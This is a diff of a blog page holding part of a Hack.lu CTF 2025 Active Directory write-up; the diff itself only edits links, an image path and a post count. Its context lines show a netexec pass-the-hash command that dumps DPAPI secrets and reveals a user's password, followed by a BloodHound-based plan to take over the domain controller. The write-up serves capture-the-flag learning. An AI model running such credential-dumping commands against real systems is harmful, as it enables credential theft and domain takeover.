@@ -145,7 +145,7 @@
 <h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Let’s use the administratör account to look for DPAPI using the <code>--dpapi</code> flag from netexec</p>
 <figure class="highlight terminal bash"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb srv02.hack.lu -u &#x27;administratör&#x27; -H 09a38021b2ecb464dda2d27ca8ef5233 --local-auth --dpapi</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:True) (SMBv1:None)</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [+] SRV02\administratör:09a38021b2ecb464dda2d27ca8ef5233 (Pwn3d!)</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [*] Collecting DPAPI masterkeys, grab a coffee and be patient...</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [+] Got 4 decrypted masterkeys. Looting secrets...</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:&#123;03AB09A0-D6E7-4FE2-9005-5F21B10E3DD1&#125; - HACK\maja.lindgren:Z4f8hF2t#K3HJsfGJX!&amp;</span><br></pre></td></tr></table></figure>
 <p>Nice! it dumped the password of the user <code>maja.lindgren</code></p>
-<h1 id="DC01-Takeover"><a href="#DC01-Takeover" class="headerlink" title="DC01 Takeover"></a>DC01 Takeover</h1><p>Looking at bloodhound, we can see that this user has some interesting permissions<br><img src="/claude/claude/AKTIVKATALOG-2-Hack-lu-CTF-2025/dc.png" alt="BloodHound showing maja.lindgren&#39;s permissions"></p>
+<h1 id="DC01-Takeover"><a href="#DC01-Takeover" class="headerlink" title="DC01 Takeover"></a>DC01 Takeover</h1><p>Looking at bloodhound, we can see that this user has some interesting permissions<br><img src="/claude/AKTIVKATALOG-2-Hack-lu-CTF-2025/dc.png" alt="BloodHound showing maja.lindgren&#39;s permissions"></p>
 <ul>
 <li><code>maja.lindgren</code> has <code>AddMember</code> over <code>KONTOANSVARIGA</code> group</li>
 <li><code>KONTOANSVARIGA</code> has <code>AllExtendedRights</code> over DC01</li>
@@ -177,9 +177,9 @@
         
         <li><time datetime="2024-08-18T22:34:29.000Z">2024-08-18</time><a href="/claude/Reflection-Vulnlab/">Reflection - Vulnlab</a></li>
         
-        <li><time datetime="2025-06-15T16:22:03.000Z">2025-06-15</time><a href="/claude/Pwning-Reflection-Using-NTLM-Reflection/">Pwning Reflection Using NTLM Reflection</a></li>
+        <li><time datetime="2026-11-18T22:46:44.000Z">2026-11-18</time><a href="/claude/GameMaster-Kenolab/">GameMaster - Kenolab</a></li>
         
-        <li><time datetime="2024-07-14T10:32:45.000Z">2024-07-14</time><a href="/claude/Phantom-Vulnlab/">Phantom - Vulnlab</a></li>
+        <li><time datetime="2025-06-15T16:22:03.000Z">2025-06-15</time><a href="/claude/Pwning-Reflection-Using-NTLM-Reflection/">Pwning Reflection Using NTLM Reflection</a></li>
         
       </ul>
     </div>
@@ -187,7 +187,7 @@
     
     <nav class="neighbors" aria-label="more posts">
       <a class="older" href="/claude/AKTIVKATALOG-1-Hack-lu-CTF-2025/" rel="next"><small>← older</small>AKTIVKATALOG 1 - Hack.lu CTF 2025</a>
-      
+      <a class="newer" href="/claude/GameMaster-Kenolab/" rel="prev"><small>newer →</small>GameMaster - Kenolab</a>
     </nav>
     
   </footer>
@@ -223,7 +223,7 @@
     </div>
   </div>
   <script type="application/json" class="commands">[{"name":"/home","hint":"list all posts","url":"/claude/"},{"name":"/archives","hint":"open archives","url":"/claude/archives/"},{"name":"/categories","hint":"open categories","url":"/claude/categories/"},{"name":"/tags","hint":"open tags","url":"/claude/tags/"},{"name":"/about","hint":"open about","url":"/claude/about/"},{"name":"/rss","hint":"subscribe to the feed","url":"/claude/atom.xml"},{"name":"/resume","hint":"go back to a post you were reading","run":"resume"},{"name":"/random","hint":"read a random post","run":"random"},{"name":"/context","hint":"how much of the context window this page takes","run":"context"},{"name":"/compact","hint":"hide command output in code blocks, or bring it back","run":"compact"},{"name":"/model","hint":"pick the model shown in the status line","run":"model"},{"name":"/effort","hint":"set how hard the model thinks","run":"effort"},{"name":"/permissions","hint":"sites you allowed links to open without asking","run":"permissions"},{"name":"/status","hint":"current model, mode and setup","run":"status"},{"name":"/theme","hint":"switch between light and dark","run":"theme"},{"name":"/butterfly","hint":"switch the blog to the Butterfly theme","url":"/?theme=butterfly"},{"name":"/loaf","hint":"switch the blog to the Loaf theme","url":"/loaf/?theme=loaf"},{"name":"/export","hint":"print this page or save it as a PDF","run":"export"},{"name":"/clear","hint":"reset the mode, filters and prompt","run":"clear"},{"name":"/top","hint":"scroll to the top","run":"top"},{"name":"/help","hint":"list commands and shortcuts","run":"help"}]</script><script>(function(){var s=document.currentScript.previousElementSibling,T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},root="/claude/",p=location.pathname,rel=p.indexOf(root)===0?p.slice(root.length):"";try{var c=JSON.parse(s.textContent);c.forEach(function(x){var m=/\?theme=([\w-]+)$/.exec(x.url||"");if(m&&T[m[1]]!==undefined)x.url=T[m[1]]+rel+"?theme="+m[1]});s.textContent=JSON.stringify(c)}catch(e){}})()</script>
-  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":24}</script>
+  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":26}</script>
 </div>
 
 <script src="/claude/js/claude.js" defer></script>
